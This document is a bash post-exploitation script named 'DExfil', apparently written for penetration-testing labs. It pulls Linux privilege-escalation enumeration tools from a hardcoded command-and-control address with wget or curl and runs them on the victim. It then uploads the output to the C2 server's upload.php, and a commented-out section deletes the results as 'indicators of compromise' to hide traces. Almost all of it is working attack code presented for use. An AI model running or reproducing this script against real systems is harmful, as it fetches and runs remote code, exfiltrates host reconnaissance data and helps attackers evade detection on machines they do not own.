# Linux Discovery Script (DExfil)
```bash
#!/bin/bash
#set -x
#trap read debug
#C2=172.16.2.11  # has to be hardcoded, unless msf
#use bash if available, else yolo (for now)
if command -v /bin/bash &> /dev/null; then
SHELL=/bin/bash;
fi

host_ip=$(hostname -I)
C2=192.168.49.206
export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
# files to pull from C2 server
declare -a enum_scripts=("LinEnum.sh" "linux-exploit-suggester.sh" "unix-privesc-check")

#if wget, use that, or case

echo "*****************************************"
for es in ${enum_scripts[@]}; do

        if command -v wget &> /dev/null; then
        echo "wget found, using as http client to download $es"
        wget http://$C2/"$es" -O /tmp/"$es" &> /dev/null;


    elif command -v curl &> /dev/null; then
echo "curl found, using as http client to download $es"
            curl http://$C2/"$es" -o /tmp/"$es" &> /dev/null;
    else
            echo "no http client could be found";
            exit;
    fi;

done

# Use case statement to customize cmdline per enum script

echo "*****************************************"
for filename in /tmp/*;
 do
        case $filename in
           /tmp/LinEnum.sh)
               echo "*****************************************"
                   echo "executing $filename with $SHELL"
                   chmod +rwx $filename
                   $SHELL $filename -t > ${filename}_0utF_$host_ip 2>/dev/null
                   ;;
            /tmp/linux-exploit-suggester.sh)
                    echo "executing $filename with $SHELL"
                    chmod +rwx "$filename"
#                   for arg in ${lin_exp_s_cmds[@]};
#                do $SHELL $filename $arg > ${filename}_0utF_$host_ip_$arg;
                #       done
                $SHELL "$filename" >  "${filename}"c_0utF_$host_ip
#               $SHELL "$filename" "--checksec" #> "${filename}"_checksec_0utF_$host_ip
#               $SHELL "/tmp/linux-exploit-suggester.sh" "--uname" "$uname_str" > ${filename}_0utF_uname_${host_ip}
                        ;;
            /tmp/unix-privesc-check)
                    echo "executing $filename with $SHELL"
                    chmod +rwx "$filename"
                    $SHELL "$filename" > "${filename}"_0utF_$host_ip
                    ;;
    esac;
done
#case statement: upload depending on available tools
echo "*****************************************"
for enum_output in /tmp/*;
do
        case $enum_output in
                *0utF*)
                        echo "attempting to upload $enum_output to C2"
                        curl -F fileToUpload=@${enum_output} $C2/upload.php #don't quote, some of the filenames contain spaces.
           ;;
esac;
done

# echo "*****************************************"
# echo "Removing indicators of compromise from disk"
# del_flag=0
# for ioc in /tmp/*;
# do
#         case $ioc in
#                 *0utF*)
#                         echo "removing $ioc"
#                         rm $ioc

#                         ;;
#                 *LinEnum.sh|*linuxprivchecker.py|*linux-exploit-suggester.sh|*unix-privesc-check)
#                                 echo "removing $ioc"
#                                 rm $ioc
#                         ;;

#         esac;
# done
# echo "******all tasks completed******"
#else scp
#get key from remote host
#execute upload with scp
#remove key
#else ftp?
#else python
# else bash?


```






















































































